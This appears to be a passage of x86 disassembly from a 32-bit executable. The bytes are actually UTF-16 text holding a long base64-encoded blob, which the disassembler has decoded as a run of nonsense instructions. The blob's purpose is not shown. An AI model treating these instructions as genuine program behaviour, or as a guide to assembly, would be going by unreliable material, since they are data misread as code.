  40a59a:	34 00                	xor    $0x0,%al
  40a59c:	50                   	push   %eax
  40a59d:	00 46 00             	add    %al,0x0(%esi)
  40a5a0:	72 00                	jb     0x40a5a2
  40a5a2:	76 00                	jbe    0x40a5a4
  40a5a4:	68 00 57 00 41       	push   $0x41005700
  40a5a9:	00 35 00 4d 00 44    	add    %dh,0x44004d00
  40a5af:	00 79 00             	add    %bh,0x0(%ecx)
  40a5b2:	52                   	push   %edx
  40a5b3:	00 32                	add    %dh,(%edx)
  40a5b5:	00 59 00             	add    %bl,0x0(%ecx)
  40a5b8:	5a                   	pop    %edx
  40a5b9:	00 36                	add    %dh,(%esi)
  40a5bb:	00 51 00             	add    %dl,0x0(%ecx)
  40a5be:	58                   	pop    %eax
  40a5bf:	00 42 00             	add    %al,0x0(%edx)
  40a5c2:	43                   	inc    %ebx
  40a5c3:	00 56 00             	add    %dl,0x0(%esi)
  40a5c6:	5a                   	pop    %edx
  40a5c7:	00 2f                	add    %ch,(%edi)
  40a5c9:	00 77 00             	add    %dh,0x0(%edi)
  40a5cc:	54                   	push   %esp
  40a5cd:	00 52 00             	add    %dl,0x0(%edx)
  40a5d0:	38 00                	cmp    %al,(%eax)
  40a5d2:	59                   	pop    %ecx
  40a5d3:	00 38                	add    %bh,(%eax)
  40a5d5:	00 71 00             	add    %dh,0x0(%ecx)
  40a5d8:	4d                   	dec    %ebp
  40a5d9:	00 62 00             	add    %ah,0x0(%edx)
  40a5dc:	72 00                	jb     0x40a5de
  40a5de:	41                   	inc    %ecx
  40a5df:	00 35 00 34 00 51    	add    %dh,0x51003400
  40a5e5:	00 7a 00             	add    %bh,0x0(%edx)
  40a5e8:	51                   	push   %ecx
  40a5e9:	00 47 00             	add    %al,0x0(%edi)
  40a5ec:	73 00                	jae    0x40a5ee
  40a5ee:	30 00                	xor    %al,(%eax)
  40a5f0:	59                   	pop    %ecx
  40a5f1:	00 6f 00             	add    %ch,0x0(%edi)
  40a5f4:	44                   	inc    %esp
  40a5f5:	00 76 00             	add    %dh,0x0(%esi)
  40a5f8:	6d                   	insl   (%dx),%es:(%edi)
  40a5f9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5fc:	43                   	inc    %ebx
  40a5fd:	00 45 00             	add    %al,0x0(%ebp)
  40a600:	43                   	inc    %ebx
  40a601:	00 4b 00             	add    %cl,0x0(%ebx)
  40a604:	31 00                	xor    %eax,(%eax)
  40a606:	45                   	inc    %ebp
  40a607:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a60a:	2f                   	das
  40a60b:	00 35 00 46 00 42    	add    %dh,0x42004600
  40a611:	00 6b 00             	add    %ch,0x0(%ebx)
  40a614:	75 00                	jne    0x40a616
  40a616:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40a61a:	6d                   	insl   (%dx),%es:(%edi)
  40a61b:	00 63 00             	add    %ah,0x0(%ebx)
  40a61e:	6c                   	insb   (%dx),%es:(%edi)
  40a61f:	00 66 00             	add    %ah,0x0(%esi)
  40a622:	62 00                	bound  %eax,(%eax)
  40a624:	42                   	inc    %edx
  40a625:	00 6a 00             	add    %ch,0x0(%edx)
  40a628:	79 00                	jns    0x40a62a
  40a62a:	37                   	aaa
  40a62b:	00 67 00             	add    %ah,0x0(%edi)
  40a62e:	43                   	inc    %ebx
  40a62f:	00 35 00 44 00 54    	add    %dh,0x54004400
  40a635:	00 66 00             	add    %ah,0x0(%esi)
  40a638:	68 00 62 00 32       	push   $0x32006200
  40a63d:	00 4f 00             	add    %cl,0x0(%edi)
  40a640:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40a644:	36 00 2f             	add    %ch,%ss:(%edi)
  40a647:	00 65 00             	add    %ah,0x0(%ebp)
  40a64a:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40a64e:	38 00                	cmp    %al,(%eax)
  40a650:	4f                   	dec    %edi
  40a651:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40a655:	00 6e 00             	add    %ch,0x0(%esi)
  40a658:	4d                   	dec    %ebp
  40a659:	00 7a 00             	add    %bh,0x0(%edx)
  40a65c:	2b 00                	sub    (%eax),%eax
  40a65e:	79 00                	jns    0x40a660
  40a660:	35 00 47 00 74       	xor    $0x74004700,%eax
  40a665:	00 65 00             	add    %ah,0x0(%ebp)
  40a668:	67 00 75 00          	add    %dh,0x0(%di)
  40a66c:	79 00                	jns    0x40a66e
  40a66e:	78 00                	js     0x40a670
  40a670:	6b 00 51             	imul   $0x51,(%eax),%eax
  40a673:	00 2b                	add    %ch,(%ebx)
  40a675:	00 48 00             	add    %cl,0x0(%eax)
  40a678:	31 00                	xor    %eax,(%eax)
  40a67a:	2f                   	das
  40a67b:	00 31                	add    %dh,(%ecx)
  40a67d:	00 69 00             	add    %ch,0x0(%ecx)
  40a680:	74 00                	je     0x40a682
  40a682:	75 00                	jne    0x40a684
  40a684:	6a 00                	push   $0x0
  40a686:	63 00                	arpl   %eax,(%eax)
  40a688:	5a                   	pop    %edx
  40a689:	00 52 00             	add    %dl,0x0(%edx)
  40a68c:	39 00                	cmp    %eax,(%eax)
  40a68e:	57                   	push   %edi
  40a68f:	00 7a 00             	add    %bh,0x0(%edx)
  40a692:	50                   	push   %eax
  40a693:	00 4d 00             	add    %cl,0x0(%ebp)
  40a696:	69 00 51 00 4d 00    	imul   $0x4d0051,(%eax),%eax
  40a69c:	68 00 66 00 41       	push   $0x41006600
  40a6a1:	00 43 00             	add    %al,0x0(%ebx)
  40a6a4:	43                   	inc    %ebx
  40a6a5:	00 31                	add    %dh,(%ecx)
  40a6a7:	00 55 00             	add    %dl,0x0(%ebp)
  40a6aa:	66 00 35 00 73 00 74 	data16 add %dh,0x74007300
  40a6b1:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6b4:	69 00 65 00 42 00    	imul   $0x420065,(%eax),%eax
  40a6ba:	2f                   	das
  40a6bb:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6be:	4a                   	dec    %edx
  40a6bf:	00 35 00 41 00 65    	add    %dh,0x65004100
  40a6c5:	00 35 00 4d 00 6f    	add    %dh,0x6f004d00
  40a6cb:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40a6cf:	00 50 00             	add    %dl,0x0(%eax)
  40a6d2:	79 00                	jns    0x40a6d4
  40a6d4:	35 00 31 00 68       	xor    $0x68003100,%eax
  40a6d9:	00 45 00             	add    %al,0x0(%ebp)
  40a6dc:	68 00 57 00 77       	push   $0x77005700
  40a6e1:	00 4f 00             	add    %cl,0x0(%edi)
  40a6e4:	35 00 6e 00 4e       	xor    $0x4e006e00,%eax
  40a6e9:	00 67 00             	add    %ah,0x0(%edi)
  40a6ec:	44                   	inc    %esp
  40a6ed:	00 59 00             	add    %bl,0x0(%ecx)
  40a6f0:	6b 00 48             	imul   $0x48,(%eax),%eax
  40a6f3:	00 49 00             	add    %cl,0x0(%ecx)
  40a6f6:	36 00 39             	add    %bh,%ss:(%ecx)
  40a6f9:	00 67 00             	add    %ah,0x0(%edi)
  40a6fc:	31 00                	xor    %eax,(%eax)
  40a6fe:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a702:	6f                   	outsl  %ds:(%esi),(%dx)
  40a703:	00 65 00             	add    %ah,0x0(%ebp)
  40a706:	34 00                	xor    $0x0,%al
  40a708:	74 00                	je     0x40a70a
  40a70a:	41                   	inc    %ecx
  40a70b:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40a70f:	00 6f 00             	add    %ch,0x0(%edi)
  40a712:	31 00                	xor    %eax,(%eax)
  40a714:	6c                   	insb   (%dx),%es:(%edi)
  40a715:	00 46 00             	add    %al,0x0(%esi)
  40a718:	59                   	pop    %ecx
  40a719:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40a71d:	00 32                	add    %dh,(%edx)
  40a71f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a722:	7a 00                	jp     0x40a724
  40a724:	48                   	dec    %eax
  40a725:	00 36                	add    %dh,(%esi)
  40a727:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a72a:	58                   	pop    %eax
  40a72b:	00 51 00             	add    %dl,0x0(%ecx)
  40a72e:	56                   	push   %esi
  40a72f:	00 6f 00             	add    %ch,0x0(%edi)
  40a732:	74 00                	je     0x40a734
  40a734:	50                   	push   %eax
  40a735:	00 66 00             	add    %ah,0x0(%esi)
  40a738:	68 00 44 00 54       	push   $0x54004400
  40a73d:	00 71 00             	add    %dh,0x0(%ecx)
  40a740:	4f                   	dec    %edi
  40a741:	00 71 00             	add    %dh,0x0(%ecx)
  40a744:	71 00                	jno    0x40a746
  40a746:	56                   	push   %esi
  40a747:	00 7a 00             	add    %bh,0x0(%edx)
  40a74a:	56                   	push   %esi
  40a74b:	00 43 00             	add    %al,0x0(%ebx)
  40a74e:	54                   	push   %esp
  40a74f:	00 77 00             	add    %dh,0x0(%edi)
  40a752:	2f                   	das
  40a753:	00 4d 00             	add    %cl,0x0(%ebp)
  40a756:	74 00                	je     0x40a758
  40a758:	74 00                	je     0x40a75a
  40a75a:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40a75e:	63 00                	arpl   %eax,(%eax)
  40a760:	2f                   	das
  40a761:	00 65 00             	add    %ah,0x0(%ebp)
  40a764:	49                   	dec    %ecx
  40a765:	00 50 00             	add    %dl,0x0(%eax)
  40a768:	55                   	push   %ebp
  40a769:	00 77 00             	add    %dh,0x0(%edi)
  40a76c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a76d:	00 43 00             	add    %al,0x0(%ebx)
  40a770:	6e                   	outsb  %ds:(%esi),(%dx)
  40a771:	00 70 00             	add    %dh,0x0(%eax)
  40a774:	2f                   	das
  40a775:	00 51 00             	add    %dl,0x0(%ecx)
  40a778:	56                   	push   %esi
  40a779:	00 77 00             	add    %dh,0x0(%edi)
  40a77c:	2f                   	das
  40a77d:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40a781:	00 41 00             	add    %al,0x0(%ecx)
  40a784:	48                   	dec    %eax
  40a785:	00 42 00             	add    %al,0x0(%edx)
  40a788:	49                   	dec    %ecx
  40a789:	00 32                	add    %dh,(%edx)
  40a78b:	00 51 00             	add    %dl,0x0(%ecx)
  40a78e:	33 00                	xor    (%eax),%eax
  40a790:	69 00 55 00 42 00    	imul   $0x420055,(%eax),%eax
  40a796:	76 00                	jbe    0x40a798
  40a798:	35 00 68 00 6c       	xor    $0x6c006800,%eax
  40a79d:	00 55 00             	add    %dl,0x0(%ebp)
  40a7a0:	61                   	popa
  40a7a1:	00 36                	add    %dh,(%esi)
  40a7a3:	00 43 00             	add    %al,0x0(%ebx)
  40a7a6:	4e                   	dec    %esi
  40a7a7:	00 6e 00             	add    %ch,0x0(%esi)
  40a7aa:	2b 00                	sub    (%eax),%eax
  40a7ac:	38 00                	cmp    %al,(%eax)
  40a7ae:	44                   	inc    %esp
  40a7af:	00 42 00             	add    %al,0x0(%edx)
  40a7b2:	50                   	push   %eax
  40a7b3:	00 55 00             	add    %dl,0x0(%ebp)
  40a7b6:	62 00                	bound  %eax,(%eax)
  40a7b8:	55                   	push   %ebp
  40a7b9:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40a7bd:	00 65 00             	add    %ah,0x0(%ebp)
  40a7c0:	6a 00                	push   $0x0
  40a7c2:	4e                   	dec    %esi
  40a7c3:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7c6:	47                   	inc    %edi
  40a7c7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7ca:	52                   	push   %edx
  40a7cb:	00 50 00             	add    %dl,0x0(%eax)
  40a7ce:	72 00                	jb     0x40a7d0
  40a7d0:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a7d4:	39 00                	cmp    %eax,(%eax)
  40a7d6:	76 00                	jbe    0x40a7d8
  40a7d8:	5a                   	pop    %edx
  40a7d9:	00 55 00             	add    %dl,0x0(%ebp)
  40a7dc:	4d                   	dec    %ebp
  40a7dd:	00 7a 00             	add    %bh,0x0(%edx)
  40a7e0:	6c                   	insb   (%dx),%es:(%edi)
  40a7e1:	00 31                	add    %dh,(%ecx)
  40a7e3:	00 78 00             	add    %bh,0x0(%eax)
  40a7e6:	56                   	push   %esi
  40a7e7:	00 79 00             	add    %bh,0x0(%ecx)
  40a7ea:	37                   	aaa
  40a7eb:	00 35 00 47 00 79    	add    %dh,0x79004700
  40a7f1:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7f4:	2f                   	das
  40a7f5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7f8:	4f                   	dec    %edi
  40a7f9:	00 38                	add    %bh,(%eax)
  40a7fb:	00 53 00             	add    %dl,0x0(%ebx)
  40a7fe:	38 00                	cmp    %al,(%eax)
  40a800:	51                   	push   %ecx
  40a801:	00 72 00             	add    %dh,0x0(%edx)
  40a804:	68 00 36 00 69       	push   $0x69003600
  40a809:	00 65 00             	add    %ah,0x0(%ebp)
  40a80c:	4f                   	dec    %edi
  40a80d:	00 50 00             	add    %dl,0x0(%eax)
  40a810:	72 00                	jb     0x40a812
  40a812:	39 00                	cmp    %eax,(%eax)
  40a814:	45                   	inc    %ebp
  40a815:	00 73 00             	add    %dh,0x0(%ebx)
  40a818:	71 00                	jno    0x40a81a
  40a81a:	52                   	push   %edx
  40a81b:	00 6f 00             	add    %ch,0x0(%edi)
  40a81e:	34 00                	xor    $0x0,%al
  40a820:	2b 00                	sub    (%eax),%eax
  40a822:	69 00 52 00 6e 00    	imul   $0x6e0052,(%eax),%eax
  40a828:	4f                   	dec    %edi
  40a829:	00 68 00             	add    %ch,0x0(%eax)
  40a82c:	6a 00                	push   $0x0
  40a82e:	5a                   	pop    %edx
  40a82f:	00 65 00             	add    %ah,0x0(%ebp)
  40a832:	79 00                	jns    0x40a834
  40a834:	41                   	inc    %ecx
  40a835:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  40a839:	00 71 00             	add    %dh,0x0(%ecx)
  40a83c:	73 00                	jae    0x40a83e
  40a83e:	78 00                	js     0x40a840
  40a840:	4c                   	dec    %esp
  40a841:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40a845:	00 4e 00             	add    %cl,0x0(%esi)
  40a848:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40a84c:	44                   	inc    %esp
  40a84d:	00 31                	add    %dh,(%ecx)
  40a84f:	00 55 00             	add    %dl,0x0(%ebp)
  40a852:	59                   	pop    %ecx
  40a853:	00 62 00             	add    %ah,0x0(%edx)
  40a856:	42                   	inc    %edx
  40a857:	00 6e 00             	add    %ch,0x0(%esi)
  40a85a:	43                   	inc    %ebx
  40a85b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a85e:	69 00 75 00 75 00    	imul   $0x750075,(%eax),%eax
  40a864:	6c                   	insb   (%dx),%es:(%edi)
  40a865:	00 76 00             	add    %dh,0x0(%esi)
  40a868:	68 00 6b 00 41       	push   $0x41006b00
  40a86d:	00 56 00             	add    %dl,0x0(%esi)
  40a870:	6f                   	outsl  %ds:(%esi),(%dx)
  40a871:	00 49 00             	add    %cl,0x0(%ecx)
  40a874:	58                   	pop    %eax
  40a875:	00 39                	add    %bh,(%ecx)
  40a877:	00 72 00             	add    %dh,0x0(%edx)
  40a87a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a87b:	00 57 00             	add    %dl,0x0(%edi)
  40a87e:	55                   	push   %ebp
  40a87f:	00 4a 00             	add    %cl,0x0(%edx)
  40a882:	38 00                	cmp    %al,(%eax)
  40a884:	32 00                	xor    (%eax),%al
  40a886:	42                   	inc    %edx
  40a887:	00 50 00             	add    %dl,0x0(%eax)
  40a88a:	39 00                	cmp    %eax,(%eax)
  40a88c:	73 00                	jae    0x40a88e
  40a88e:	39 00                	cmp    %eax,(%eax)
  40a890:	34 00                	xor    $0x0,%al
  40a892:	48                   	dec    %eax
  40a893:	00 6d 00             	add    %ch,0x0(%ebp)
  40a896:	4a                   	dec    %edx
  40a897:	00 2f                	add    %ch,(%edi)
  40a899:	00 72 00             	add    %dh,0x0(%edx)
  40a89c:	76 00                	jbe    0x40a89e
  40a89e:	46                   	inc    %esi
  40a89f:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40a8a3:	00 39                	add    %bh,(%ecx)
  40a8a5:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
  40a8a9:	00 6a 00             	add    %ch,0x0(%edx)
  40a8ac:	31 00                	xor    %eax,(%eax)
  40a8ae:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40a8b1:	00 65 00             	add    %ah,0x0(%ebp)
  40a8b4:	44                   	inc    %esp
  40a8b5:	00 42 00             	add    %al,0x0(%edx)
  40a8b8:	55                   	push   %ebp
  40a8b9:	00 76 00             	add    %dh,0x0(%esi)
  40a8bc:	2f                   	das
  40a8bd:	00 6e 00             	add    %ch,0x0(%esi)
  40a8c0:	79 00                	jns    0x40a8c2
  40a8c2:	4e                   	dec    %esi
  40a8c3:	00 47 00             	add    %al,0x0(%edi)
  40a8c6:	7a 00                	jp     0x40a8c8
  40a8c8:	2f                   	das
  40a8c9:	00 4a 00             	add    %cl,0x0(%edx)
  40a8cc:	7a 00                	jp     0x40a8ce
  40a8ce:	38 00                	cmp    %al,(%eax)
  40a8d0:	45                   	inc    %ebp
  40a8d1:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a8d5:	00 77 00             	add    %dh,0x0(%edi)
  40a8d8:	59                   	pop    %ecx
  40a8d9:	00 57 00             	add    %dl,0x0(%edi)
  40a8dc:	6b 00 3d             	imul   $0x3d,(%eax),%eax
  40a8df:	00 00                	add    %al,(%eax)
  40a8e1:	87 b1 4e 00 5a 00    	xchg   %esi,0x5a004e(%ecx)
  40a8e7:	2b 00                	sub    (%eax),%eax
  40a8e9:	4d                   	dec    %ebp
  40a8ea:	00 49 00             	add    %cl,0x0(%ecx)
  40a8ed:	4a                   	dec    %edx
  40a8ee:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40a8f2:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8f5:	69 00 71 00 56 00    	imul   $0x560071,(%eax),%eax
  40a8fb:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40a8ff:	6d                   	insl   (%dx),%es:(%edi)
  40a900:	00 71 00             	add    %dh,0x0(%ecx)
  40a903:	48                   	dec    %eax
  40a904:	00 7a 00             	add    %bh,0x0(%edx)
  40a907:	43                   	inc    %ebx
  40a908:	00 5a 00             	add    %bl,0x0(%edx)
  40a90b:	33 00                	xor    (%eax),%eax
  40a90d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a90e:	00 65 00             	add    %ah,0x0(%ebp)
  40a911:	2b 00                	sub    (%eax),%eax
  40a913:	6f                   	outsl  %ds:(%esi),(%dx)
  40a914:	00 45 00             	add    %al,0x0(%ebp)
  40a917:	7a 00                	jp     0x40a919
  40a919:	6d                   	insl   (%dx),%es:(%edi)
  40a91a:	00 4f 00             	add    %cl,0x0(%edi)
  40a91d:	61                   	popa
  40a91e:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  40a922:	00 48 00             	add    %cl,0x0(%eax)
  40a925:	34 00                	xor    $0x0,%al
  40a927:	48                   	dec    %eax
  40a928:	00 56 00             	add    %dl,0x0(%esi)
  40a92b:	47                   	inc    %edi
  40a92c:	00 6e 00             	add    %ch,0x0(%esi)
  40a92f:	73 00                	jae    0x40a931
  40a931:	50                   	push   %eax
  40a932:	00 37                	add    %dh,(%edi)
  40a934:	00 73 00             	add    %dh,0x0(%ebx)
  40a937:	55                   	push   %ebp
  40a938:	00 4e 00             	add    %cl,0x0(%esi)
  40a93b:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a93f:	31 00                	xor    %eax,(%eax)
  40a941:	56                   	push   %esi
  40a942:	00 35 00 38 00 75    	add    %dh,0x75003800
  40a948:	00 43 00             	add    %al,0x0(%ebx)
  40a94b:	33 00                	xor    (%eax),%eax
  40a94d:	53                   	push   %ebx
  40a94e:	00 48 00             	add    %cl,0x0(%eax)
  40a951:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40a955:	31 00                	xor    %eax,(%eax)
  40a957:	4f                   	dec    %edi
  40a958:	00 50 00             	add    %dl,0x0(%eax)
  40a95b:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40a95f:	37                   	aaa
  40a960:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40a964:	00 68 00             	add    %ch,0x0(%eax)
  40a967:	46                   	inc    %esi
  40a968:	00 77 00             	add    %dh,0x0(%edi)
  40a96b:	6d                   	insl   (%dx),%es:(%edi)
  40a96c:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40a970:	00 33                	add    %dh,(%ebx)
  40a972:	00 31                	add    %dh,(%ecx)
  40a974:	00 70 00             	add    %dh,0x0(%eax)
  40a977:	59                   	pop    %ecx
  40a978:	00 39                	add    %bh,(%ecx)
  40a97a:	00 6f 00             	add    %ch,0x0(%edi)
  40a97d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a981:	4b                   	dec    %ebx
  40a982:	00 73 00             	add    %dh,0x0(%ebx)
  40a985:	6a 00                	push   $0x0
  40a987:	68 00 46 00 4c       	push   $0x4c004600
  40a98c:	00 50 00             	add    %dl,0x0(%eax)
  40a98f:	70 00                	jo     0x40a991
  40a991:	71 00                	jno    0x40a993
  40a993:	52                   	push   %edx
  40a994:	00 6f 00             	add    %ch,0x0(%edi)
  40a997:	33 00                	xor    (%eax),%eax
  40a999:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a99d:	72 00                	jb     0x40a99f
  40a99f:	4a                   	dec    %edx
  40a9a0:	00 5a 00             	add    %bl,0x0(%edx)
  40a9a3:	42                   	inc    %edx
  40a9a4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9a7:	78 00                	js     0x40a9a9
  40a9a9:	39 00                	cmp    %eax,(%eax)
  40a9ab:	54                   	push   %esp
  40a9ac:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  40a9b0:	00 50 00             	add    %dl,0x0(%eax)
  40a9b3:	75 00                	jne    0x40a9b5
  40a9b5:	59                   	pop    %ecx
  40a9b6:	00 66 00             	add    %ah,0x0(%esi)
  40a9b9:	6a 00                	push   $0x0
  40a9bb:	47                   	inc    %edi
  40a9bc:	00 56 00             	add    %dl,0x0(%esi)
  40a9bf:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9c0:	00 50 00             	add    %dl,0x0(%eax)
  40a9c3:	77 00                	ja     0x40a9c5
  40a9c5:	55                   	push   %ebp
  40a9c6:	00 49 00             	add    %cl,0x0(%ecx)
  40a9c9:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a9cd:	68 00 2b 00 39       	push   $0x39002b00
  40a9d2:	00 31                	add    %dh,(%ecx)
  40a9d4:	00 38                	add    %bh,(%eax)
  40a9d6:	00 70 00             	add    %dh,0x0(%eax)
  40a9d9:	50                   	push   %eax
  40a9da:	00 38                	add    %bh,(%eax)
  40a9dc:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40a9e0:	00 32                	add    %dh,(%edx)
  40a9e2:	00 2b                	add    %ch,(%ebx)
  40a9e4:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a9e8:	00 56 00             	add    %dl,0x0(%esi)
  40a9eb:	44                   	inc    %esp
  40a9ec:	00 38                	add    %bh,(%eax)
  40a9ee:	00 48 00             	add    %cl,0x0(%eax)
  40a9f1:	61                   	popa
  40a9f2:	00 68 00             	add    %ch,0x0(%eax)
  40a9f5:	70 00                	jo     0x40a9f7
  40a9f7:	76 00                	jbe    0x40a9f9
  40a9f9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9fa:	00 5a 00             	add    %bl,0x0(%edx)
  40a9fd:	4a                   	dec    %edx
  40a9fe:	00 48 00             	add    %cl,0x0(%eax)
  40aa01:	2f                   	das
  40aa02:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa05:	51                   	push   %ecx
  40aa06:	00 2f                	add    %ch,(%edi)
  40aa08:	00 52 00             	add    %dl,0x0(%edx)
  40aa0b:	70 00                	jo     0x40aa0d
  40aa0d:	54                   	push   %esp
  40aa0e:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40aa12:	00 67 00             	add    %ah,0x0(%edi)
  40aa15:	78 00                	js     0x40aa17
  40aa17:	70 00                	jo     0x40aa19
  40aa19:	66 00 76 00          	data16 add %dh,0x0(%esi)
  40aa1d:	42                   	inc    %edx
  40aa1e:	00 46 00             	add    %al,0x0(%esi)
  40aa21:	75 00                	jne    0x40aa23
  40aa23:	6b 00 47             	imul   $0x47,(%eax),%eax
  40aa26:	00 58 00             	add    %bl,0x0(%eax)
  40aa29:	4b                   	dec    %ebx
  40aa2a:	00 4f 00             	add    %cl,0x0(%edi)
  40aa2d:	36 00 50 00          	add    %dl,%ss:0x0(%eax)
  40aa31:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40aa35:	4b                   	dec    %ebx
  40aa36:	00 32                	add    %dh,(%edx)
  40aa38:	00 78 00             	add    %bh,0x0(%eax)
  40aa3b:	30 00                	xor    %al,(%eax)
  40aa3d:	49                   	dec    %ecx
  40aa3e:	00 78 00             	add    %bh,0x0(%eax)
  40aa41:	2f                   	das
  40aa42:	00 51 00             	add    %dl,0x0(%ecx)
  40aa45:	78 00                	js     0x40aa47
  40aa47:	2f                   	das
  40aa48:	00 79 00             	add    %bh,0x0(%ecx)
  40aa4b:	59                   	pop    %ecx
  40aa4c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa4f:	51                   	push   %ecx
  40aa50:	00 4f 00             	add    %cl,0x0(%edi)
  40aa53:	4d                   	dec    %ebp
  40aa54:	00 45 00             	add    %al,0x0(%ebp)
  40aa57:	45                   	inc    %ebp
  40aa58:	00 59 00             	add    %bl,0x0(%ecx)
  40aa5b:	54                   	push   %esp
  40aa5c:	00 75 00             	add    %dh,0x0(%ebp)
  40aa5f:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40aa63:	41                   	inc    %ecx
  40aa64:	00 46 00             	add    %al,0x0(%esi)
  40aa67:	36 00 44 00 30       	add    %al,%ss:0x30(%eax,%eax,1)
  40aa6c:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  40aa70:	00 59 00             	add    %bl,0x0(%ecx)
  40aa73:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40aa77:	4f                   	dec    %edi
  40aa78:	00 69 00             	add    %ch,0x0(%ecx)
  40aa7b:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa7c:	00 63 00             	add    %ah,0x0(%ebx)
  40aa7f:	72 00                	jb     0x40aa81
  40aa81:	74 00                	je     0x40aa83
  40aa83:	56                   	push   %esi
  40aa84:	00 50 00             	add    %dl,0x0(%eax)
  40aa87:	2b 00                	sub    (%eax),%eax
  40aa89:	59                   	pop    %ecx
  40aa8a:	00 42 00             	add    %al,0x0(%edx)
  40aa8d:	55                   	push   %ebp
  40aa8e:	00 35 00 6d 00 58    	add    %dh,0x58006d00
  40aa94:	00 5a 00             	add    %bl,0x0(%edx)
  40aa97:	6c                   	insb   (%dx),%es:(%edi)
  40aa98:	00 66 00             	add    %ah,0x0(%esi)
  40aa9b:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40aa9f:	62 00                	bound  %eax,(%eax)
  40aaa1:	42                   	inc    %edx
  40aaa2:	00 49 00             	add    %cl,0x0(%ecx)
  40aaa5:	4b                   	dec    %ebx
  40aaa6:	00 43 00             	add    %al,0x0(%ebx)
  40aaa9:	55                   	push   %ebp
  40aaaa:	00 4a 00             	add    %cl,0x0(%edx)
  40aaad:	42                   	inc    %edx
  40aaae:	00 4b 00             	add    %cl,0x0(%ebx)
  40aab1:	2b 00                	sub    (%eax),%eax
  40aab3:	4e                   	dec    %esi
  40aab4:	00 37                	add    %dh,(%edi)
  40aab6:	00 66 00             	add    %ah,0x0(%esi)
  40aab9:	58                   	pop    %eax
  40aaba:	00 31                	add    %dh,(%ecx)
  40aabc:	00 39                	add    %bh,(%ecx)
  40aabe:	00 55 00             	add    %dl,0x0(%ebp)
  40aac1:	31 00                	xor    %eax,(%eax)
  40aac3:	52                   	push   %edx
  40aac4:	00 57 00             	add    %dl,0x0(%edi)
  40aac7:	6c                   	insb   (%dx),%es:(%edi)
  40aac8:	00 41 00             	add    %al,0x0(%ecx)
  40aacb:	51                   	push   %ecx
  40aacc:	00 52 00             	add    %dl,0x0(%edx)
  40aacf:	49                   	dec    %ecx
  40aad0:	00 6e 00             	add    %ch,0x0(%esi)
  40aad3:	48                   	dec    %eax
  40aad4:	00 52 00             	add    %dl,0x0(%edx)
  40aad7:	73 00                	jae    0x40aad9
  40aad9:	41                   	inc    %ecx
  40aada:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40aade:	00 33                	add    %dh,(%ebx)
  40aae0:	00 73 00             	add    %dh,0x0(%ebx)
  40aae3:	74 00                	je     0x40aae5
  40aae5:	79 00                	jns    0x40aae7
  40aae7:	30 00                	xor    %al,(%eax)
  40aae9:	4b                   	dec    %ebx
  40aaea:	00 43 00             	add    %al,0x0(%ebx)
  40aaed:	4f                   	dec    %edi
  40aaee:	00 75 00             	add    %dh,0x0(%ebp)
  40aaf1:	4d                   	dec    %ebp
  40aaf2:	00 2b                	add    %ch,(%ebx)
  40aaf4:	00 67 00             	add    %ah,0x0(%edi)
  40aaf7:	6b 00 76             	imul   $0x76,(%eax),%eax
  40aafa:	00 43 00             	add    %al,0x0(%ebx)
